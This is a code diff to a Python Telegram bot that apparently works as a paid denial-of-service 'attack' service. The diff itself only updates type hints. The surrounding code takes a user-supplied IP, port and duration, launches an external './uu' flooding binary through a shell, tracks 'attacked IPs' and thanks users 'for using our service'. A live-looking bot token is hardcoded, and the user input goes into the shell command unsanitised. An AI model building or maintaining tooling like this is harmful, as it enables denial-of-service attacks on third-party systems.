@@ -1,7 +1,7 @@
 import os
 import asyncio
 from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext
+from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.error import TelegramError
 
 TELEGRAM_BOT_TOKEN = '7636730003:AAFRKwkdag_9JwLRkwS7vhddut91jqIcJtM'
@@ -11,7 +11,7 @@ bot_access_free = True
 # Store attacked IPs to prevent duplicate attacks
 attacked_ips = set()
 
-async def start(update: Update, context: CallbackContext):
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     message = (
         "*🔥 Welcome to the battlefield! 🔥*\n\n"
@@ -20,7 +20,7 @@ async def start(update: Update, context: CallbackContext):
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def run_attack(chat_id, ip, port, duration, context):
+async def run_attack(chat_id, ip, port, duration, context: ContextTypes.DEFAULT_TYPE):
     try:
         process = await asyncio.create_subprocess_shell(
             f"./uu {ip} {port} {duration}",
@@ -40,7 +40,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     finally:
         await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
 
-async def attack(update: Update, context: CallbackContext):
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id  
 
@@ -79,4 +79,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-    
